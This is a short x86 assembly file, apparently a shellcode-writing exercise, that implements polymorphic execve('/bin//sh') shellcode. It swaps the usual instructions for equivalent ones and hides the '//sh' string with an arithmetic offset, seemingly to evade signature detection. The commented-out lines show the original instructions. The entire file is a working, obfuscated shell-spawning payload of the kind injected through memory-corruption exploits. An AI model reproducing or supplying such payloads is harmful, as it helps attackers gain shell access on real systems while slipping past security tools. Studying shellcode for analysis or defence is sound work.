; Name: polymorphism

global _start

section .text
_start:
	
	;xor eax, eax
	mov ebx, eax
	xor eax, ebx

	;push eax

	mov dword [esp-4], eax
	sub esp, 4

	
	; mov dword [esp-4], 0x68732f2f
	cld
	mov esi, 0x57621e1e
	add esi, 0x11111111
	mov dword [esp-4], esi
	std

	mov dword [esp-8], 0x6e69622f
	sub esp, 8
	;push 0x68732f2f
	;push 0x6e69622f
	
	mov ebx,esp

	; Push NULL to the stack
	push eax

	mov edx, esp

	push ebx
	mov ecx, esp
	
	; SYSCALL

	mov al, 11
	int 0x80
